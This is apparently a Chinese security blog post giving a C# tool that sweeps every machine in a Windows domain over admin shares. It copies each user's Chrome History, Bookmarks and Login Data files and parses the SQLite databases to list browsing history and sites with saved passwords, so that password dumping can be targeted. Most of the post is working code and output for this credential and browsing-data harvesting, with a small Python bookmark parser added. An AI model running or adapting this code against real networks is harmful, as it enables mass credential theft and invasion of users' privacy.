> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/fsALaUjGvZwitEF8D-cf-g)

```
上文说了内网批量获取域内文件，在一些场景里面我们需要获取某台机器权限，但是可能之对外开放了80，22等端口无法通过常规手段getshell，可能在某台it个人pc存放了密码本。然而还有一些情况就是我们只需要获取某台web的后台权限即可，在一些内网环境上千台的机器，我们需要一台一台去翻找浏览器密码，就相当麻烦，于是我们可以批量解析域内每台机器，以及对应机器上的用户的chrome浏览器的书签和历史记录以及是否保存了密码为文本，然后再针对的上那台机器去dump密码，可以节约很多的时间成本。<br style="visibility: visible;">
```

#### 0x01 获取 chrome 相关文件

chrome 浏览器的一些保存文件在

```
C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default<br style="visibility: visible;">
```

```
Bookmarks 书签<br style="visibility: visible;">History 历史记录<br style="visibility: visible;">Login Data 保存密码相关记录<br style="visibility: visible;">
```

我们按照之前的获取域内文件同理的方法，这里就不过多讲解了。创建 machine.txt，逐行读取机器。

获取当前路径创建 TargetChromeFiles 目录

```
string currentpath = Directory.GetCurrentDirectory();string DesktopFiles = currentpath + "\\TargetChromeFiles";
```

遍历 users 目录如果存在 ```C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default`` 如果存在创建机器名文件夹以及对应的用户名文件夹

```
string userpath = @"\\" + machine + @"\c$\users";var user_list = Directory.EnumerateDirectories(userpath);foreach (string user in user_list){ string ChromePath = user + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default"; string username = substring(user); if (Directory.Exists(ChromePath)){  string MachineFolder = DesktopFiles + "\\" + machine;  Directory.CreateDirectory(MachineFolder);  string UserFolder = MachineFolder + "\\" + username;  Directory.CreateDirectory(UserFolder); }}
```

获取对应机器以及用户的历史记录文件

```
string historyPath = ChromePath + "\\History";if (File.Exists(historyPath)){    string historyfile = UserFolder + "\\History";    StreamWriter history_file = File.CreateText(historyfile);    history_file.Close();    bool isrewrite = true;    File.Copy(historyPath, historyfile, isrewrite);}
```

如果存在就继续创建 History 文件，同理书签和密码保存位置

```
string loginPath = ChromePath + "\\Login Data";if (File.Exists(loginPath)){    string loginfile = UserFolder + "\\Login Data";    StreamWriter login_file = File.CreateText(loginfile);    login_file.Close();    bool isrewrite = true;    File.Copy(loginPath, loginfile, isrewrite);}string BookPath = ChromePath + "\\Bookmarks";if (File.Exists(BookPath)){    string bookfile = UserFolder + "\\Bookmarks";    StreamWriter book_file = File.CreateText(bookfile);    book_file.Close();    bool isrewrite = true;    File.Copy(BookPath, bookfile, isrewrite);}
```

dump 效果

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6p0IDElvwKw42fesugibQpsxGDxJIOlNwyIJHzwTUicRCaNAr1VRWFJe0Vkk07icU9LkGh3U7iaJicsVQ/640?wx_fmt=png)

`Login Data`为 sqlite 保存形式

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6p0IDElvwKw42fesugibQps1qa9rVuLOSibVUddd6H3j4dfOsC0PKOI58K44qun3ERwLseOIp3GKrw/640?wx_fmt=png)

所以我们需要批量解析本地`TargetChromeFiles`目录内的所有文件为文本形式。把结果生在在本地的`output_TargetChromeInfos`目录。

首先创建该目录

```
string currentpath = Directory.GetCurrentDirectory();string getchromeinfopath = currentpath + "\\output_TargetChromeInfos";Directory.CreateDirectory(getchromeinfopath);
```

遍历`TargetChromeFiles`目录所有机器，创建对应的机器目录

```
string ChromeFilesPath = currentpath + "\\TargetChromeFiles";if (Directory.Exists(ChromeFilesPath)){    Console.ForegroundColor = ConsoleColor.Yellow;    Console.WriteLine("[*]开始解析chrome浏览器信息");    Console.ForegroundColor = ConsoleColor.White;    var machine_list = Directory.EnumerateDirectories(ChromeFilesPath);    foreach (string machine in machine_list)    {        Console.ForegroundColor = ConsoleColor.Yellow;        string out_machine_info = substring(machine);   //获取结尾地址        Console.WriteLine("[*]" + out_machine_info);        Console.ForegroundColor = ConsoleColor.White;        //创建本地机器文件夹        string getmachinepath = getchromeinfopath + "\\" + out_machine_info;        Directory.CreateDirectory(getmachinepath);
```

继续创建用户目录

```
var user_list = Directory.EnumerateDirectories(machine); foreach (string user in user_list) {     Console.ForegroundColor = ConsoleColor.Yellow;     string out_user_info = substring(user);     Console.WriteLine("   " + out_user_info);     Console.ForegroundColor = ConsoleColor.White;     string getuserpath = getmachinepath + "\\" + out_user_info;     Directory.CreateDirectory(getuserpath);
```

因为书签是 json 格式，这里我没有做任何处理。直接把内容写进 out 目录的 Bookmarks 文件了。

```
string book_path = user + "\\Bookmarks";if (File.Exists(book_path)){    string getbookpath = getuserpath + "\\Bookmarks";    StreamWriter bookmark = File.CreateText(getbookpath);    bookmark.Close();    File.Copy(book_path, getbookpath, true);    Console.ForegroundColor = ConsoleColor.Green;    Console.WriteLine("      [*]bookmarks parse success");    Console.ForegroundColor = ConsoleColor.White;}else{    Console.ForegroundColor = ConsoleColor.Red;    Console.WriteLine("      [-]bookmarks not found");    Console.ForegroundColor = ConsoleColor.White;}
```

如果想要好看点可以如果代码来美化一下即可。

```
from os import nameimport ref = open('C:/Users/Administrator/AppData/Local/Google/Chrome/User Data/Default/Bookmarks',encoding='UTF-8')while True:    line = f.readline()    if not line:        break    else:        try:            line.decode('utf8')        except:            res = (str(line))            url_re = re.compile('"url": "(.*?)"',re.I|re.S)            name_re = re.compile('"name": "(.*?)"',re.I|re.S)            url_result = url_re.findall(res)            name_result = name_re.findall(res)            for url in url_result:                 print(url)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6p0IDElvwKw42fesugibQpsYnUXYdQzRkRzOgUllvTiaIghbC8TF4iaqTGKFCOSKkfibtppv89icaibFkA/640?wx_fmt=png)

看到历史记录文件

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6p0IDElvwKw42fesugibQpsV8SmOW0FvKU5uVNhu7qbtSXQOvVmkImFr9z7JeGhiayVKAjbpfLHwNg/640?wx_fmt=png)

我们获取想要的即可

```
string History_path = user + "\\History";if (File.Exists(History_path)){    string gethistorypath = getuserpath + "\\History.txt";    StreamWriter history = File.CreateText(gethistorypath);    history.Close();    SQLiteConnection connect = new SQLiteConnection(@"Data Source=" + History_path);    connect.Open();    SQLiteCommand fcmd = connect.CreateCommand();    fcmd.CommandText = @"select * from urls";    fcmd.CommandType = CommandType.Text;    SQLiteDataReader r = fcmd.ExecuteReader();    string HistoryHostof = "host:" + out_machine_info + "\r\n";    string HistoryMemberof = "user:" + out_user_info + "\r\n\r\n";    File.AppendAllText(gethistorypath, HistoryHostof);    File.AppendAllText(gethistorypath, HistoryMemberof);    while (r.Read())    {        string title = (string)r["title"];        string out_title = "title:" + title + "\r\n";        string url = (string)r["url"];        string out_url ="url:" + url + "\r\n\r\n";        File.AppendAllText(gethistorypath, out_title);        File.AppendAllText( gethistorypath, out_url);    }    connect.Close();    Console.ForegroundColor = ConsoleColor.Green;    Console.WriteLine("      [*]history parse success");    Console.ForegroundColor = ConsoleColor.White;}else{    Console.ForegroundColor = ConsoleColor.Red;    Console.WriteLine("      [-]history not found");    Console.ForegroundColor = ConsoleColor.White;}
```

关于 csharp 操作 sqlite 这里不做过多介绍，网上也有很多相关代码和教程。

最近就是获取密码保存的文件记录

```
string LoginData_path = user + "\\Login Data";if (File.Exists(LoginData_path)){    string getloginypath = getuserpath + "\\Login Data.txt";    StreamWriter login = File.CreateText(getloginypath);    login.Close();    SQLiteConnection connect = new SQLiteConnection(@"Data Source=" + LoginData_path);    connect.Open();    SQLiteCommand fcmd = connect.CreateCommand();    fcmd.CommandText = @"select * from logins";    fcmd.CommandType = CommandType.Text;    SQLiteDataReader r = fcmd.ExecuteReader();    string HistoryHostof = "host:" + out_machine_info + "\r\n";    string HistoryMemberof = "user:" + out_user_info + "\r\n\r\n";    File.AppendAllText(getloginypath, HistoryHostof);    File.AppendAllText(getloginypath, HistoryMemberof);    List<String> Field = new List<string>();    while (r.Read())    {        string origin_url = (string)r["origin_url"];        string out_origin_url = "origin_url:" + origin_url + "\r\n";        string acition_url = (string)r["action_url"];        string out_acition_url = "acition_url:" + acition_url + "\r\n";        Int64 blacklisted_by_user = (Int64)r["blacklisted_by_user"];        string out_blacklisted_by_user = "blacklisted_by_user:" + blacklisted_by_user + "\r\n";        File.AppendAllText(getloginypath, out_origin_url);        File.AppendAllText(getloginypath, out_acition_url);        File.AppendAllText(getloginypath, out_blacklisted_by_user);    }    connect.Close();    Console.ForegroundColor = ConsoleColor.Green;    Console.WriteLine("      [*]login data parse success");    Console.ForegroundColor = ConsoleColor.White;}else{    Console.ForegroundColor = ConsoleColor.Red;    Console.WriteLine("      [-]login data not found");    Console.ForegroundColor = ConsoleColor.White;}
```

当我们获取到`blacklisted_by_user`为 1 说明目标开启了不保存该网站密码，反之则保存。

这里测试环境为本机环境，经过大量授权实战环境测试，目前没有发现问题。

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6p0IDElvwKw42fesugibQpsQK6uZibRNZcKNgfE3Ix665Y8pSZ2znf0IiajicMJ8GcNfDibtQXYMcibRvA/640?wx_fmt=png)

最后效果。

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6p0IDElvwKw42fesugibQps7oWnIgeF178PzSQ8gZtjKDaANZHZAFMBHib4UyjvmcAicjJmxkkR0nnA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6p0IDElvwKw42fesugibQpsR2GE3b5nfkJzDHetJ2edJdTWbwGB8WItpHibhoaicv0TMtjmUSV0J6dw/640?wx_fmt=png)

加下方 wx，拉你一起进群学习

![](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v4WZgYJeibL4XoXol2MibfTeNPUTuUmqkgMFFf3icptn2CEN5kJEOOPWMg7STl235fSLQMgQ8GuSmWSg/640?wx_fmt=jpeg)

往期推荐

[

什么？你还不会 webshell 免杀？（五）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247502241&idx=1&sn=5c767ad655dd6914a3a594169dfeafc2&chksm=ce67731df910fa0b2d971eff4d356b443e9f21b3a99e2e074b62f0a74d55a1e0d5a5536ed777&scene=21#wechat_redirect)

[

深入注册表监控



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247502166&idx=1&sn=458499507183f8fb65df22850d4a978c&chksm=ce6773eaf910fafc8179acd9c825ee9e45ad61f1fb406313d37069143c4dbcc76d73a184d8cd&scene=21#wechat_redirect)

[

net 反射



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247502154&idx=1&sn=9d0ef9765a8502ad8cd08d9628d7fbce&chksm=ce6773f6f910fae0743a2fd4dcff6d4e13bba1ee8472e710cb80a089f3dac787e9d174023ed7&scene=21#wechat_redirect)

[

x64 下隐藏可执行内存



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247502025&idx=1&sn=afbe5845715568e7684c7dda3beb6f31&chksm=ce677275f910fb63320fd5eaae0f27c43309a5f9d9d51613a56230936e1d6581d6feb3e35f88&scene=21#wechat_redirect)

[

firefox 批量 get password



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247502008&idx=1&sn=5036a51f3dfc3b2c2b42c1786ae16dc6&chksm=ce677204f910fb128fb0507f2f67fd17c0ed69418b71a59268043f4ee1afcabec088b9dee3ed&scene=21#wechat_redirect)

[

内核 APC & 用户 APC 详解



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247501943&idx=1&sn=75bb5d630058e9e5067cab57ef228e04&chksm=ce6772cbf910fbdd5649fadc924ca7e2ccd84f73ff536ed95a99e060218a9164af7bd4021387&scene=21#wechat_redirect)

[

Demo 版菜刀



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247501693&idx=1&sn=418ba0866f99fa7e03e402444c9ad15d&chksm=ce677dc1f910f4d7fb73c5e079ed60b6c7967c7b9ec1d03d04e133d8ac384b6f9524f0614d4c&scene=21#wechat_redirect)

[

浅谈 EDR 绕过



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247501111&idx=1&sn=feee7191c9abe3845e032baf17316198&chksm=ce677f8bf910f69d98e260afec8ee2e765055a6558bc9f7ddb20467fbccdc89a3c5b505dc25c&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibZ6uZjjH3v7LQZwTb4qED3KvozKicnJd9ejpVoCntCRqf53IiaK2T3myzcUn5sswkUPfpQj1KHAALFcMFNYjfriaw/640?wx_fmt=gif)